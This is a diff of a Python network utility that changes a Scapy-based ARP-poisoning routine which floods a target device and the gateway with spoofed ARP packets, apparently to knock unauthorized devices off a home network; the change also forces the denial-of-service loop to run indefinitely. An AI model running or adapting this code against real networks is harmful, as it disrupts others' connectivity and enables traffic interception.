@@ -259,10 +259,10 @@ class utilities():
 
         
     
-    def kick_arp(self, ip: str, mac: str):
+    def kick_arp(self, ip: str, mac: str, router_info: tuple, CONSOLE):
         """Responsible for disallowing unauthorized devices found on the network"""
 
-        console.print(f"{ip} <---> {mac}")
+        CONSOLE.print(f"\n[bold red]Poisoning:[/bold red] {ip} <---> {mac}")
 
         #info = unauthorized_device.split('|')
         #ip = info[2]
@@ -278,13 +278,18 @@ class utilities():
         # LAYER 2 PACKET // ARP
 
         mac = mac.strip()
+        
 
-        router_mac = "4c:19:5d:15:76:8b"
+        # PULL ROUTER INFO
+        ROUTER_IP = router_info[0].strip()
+        ROUTER_MAC = router_info[1].strip()
+        #router_mac = "4c:19:5d:15:76:8b"
+       # CONSOLE.print("[bold green]Current Gateway: [/bold green]", ROUTER_IP, ROUTER_MAC)
 
         fake_mac = "00:12:ff:12:44:12"
 
-        packet_layer_2 = Ether(src= fake_mac, dst=mac) / ARP(psrc="192.168.1.1", pdst=ip, hwsrc= fake_mac, hwdst=mac) 
-        packet_for_router = Ether(src=fake_mac, dst=router_mac) / ARP(psrc=ip, pdst="192.168.1.1", hwsrc=fake_mac, hwdst=router_mac)
+        packet_layer_2 = Ether(src= fake_mac, dst=mac) / ARP(psrc=ROUTER_IP, pdst=ip, hwsrc= fake_mac, hwdst=mac) 
+        packet_for_router = Ether(src=fake_mac, dst=ROUTER_MAC) / ARP(psrc=ip, pdst=ROUTER_IP, hwsrc=fake_mac, hwdst=ROUTER_MAC)
 
         # NOTIFY USER THAT THE ATTACK IS STARTING
         msg_start = f"Now launching a Denial-of-service attack on {ip}"
@@ -295,25 +300,29 @@ class utilities():
             sendp(packet_layer_2, verbose=False)
             sendp(packet_for_router, verbose=False)
             
-            if packets_sent > 10000:
+            if packets_sent > 30000:
 
                 ping = IP(dst=ip) / ICMP()
                 
                 # WAIT BEFORE PINGING TO SEE IF DEVICE CONNECTS BACK
-                time.sleep(5)
+                time.sleep(1)
                 response = sr1(ping, timeout=5, verbose=False)
                 total_packets += packets_sent
+                
+
+                # USE THIS INSTEAD TO KEEP THE LOOP GOING
+                RESPONSE = True
 
 
-                if response:
-                    console.print(f"Device: {ip} is still online resuming Denial-of-Service attack")
+                if RESPONSE:
+                    CONSOLE.print(f"Device: {ip} is still online resuming Denial-of-Service attack, Total Packets sent: {total_packets}")
 
                 else:
                     
           
                     msg = f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent"
                     #utilities().tts(msg)
-                    console.print(f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent")
+                    CONSOLE.print(f"Device: {ip} was successfully kicked off your network, with a total of: {total_packets} packets sent")
                    
                    # CREATE A THREAD RESPONSIBLE FOR KEEPING DEVICE DISCONNECTED
                     dhcp_monitor = dhcp_capture()  # Instantiate the class properly
@@ -327,7 +336,7 @@ class utilities():
                 packets_sent = 0
 
             
-            print(f"Packets sent: {total_packets}", end='\r', flush=True)
+           # print(f"Packets sent: {total_packets}", end='\r', flush=True)
             packets_sent += 1
 
     
